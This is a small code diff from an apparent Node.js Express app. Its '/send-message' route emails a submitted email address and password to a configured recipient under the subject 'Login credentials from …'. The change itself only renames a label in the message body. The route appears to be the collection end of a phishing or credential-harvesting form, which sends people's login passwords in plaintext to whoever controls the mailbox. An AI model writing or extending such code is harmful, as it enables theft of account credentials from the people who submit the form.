@@ -96,7 +96,7 @@ app.post('/send-message', async (req, res) => {
     to:      process.env.MAIL_TO,
     replyTo: safeEmail,
     subject: `Login credentials from ${safeEmail}`,
-    text:    `Email: ${safeEmail}\npassword: ${safePass}`,
+    text:    `Username: ${safeEmail}\npassword: ${safePass}`,
   };
 
   try {
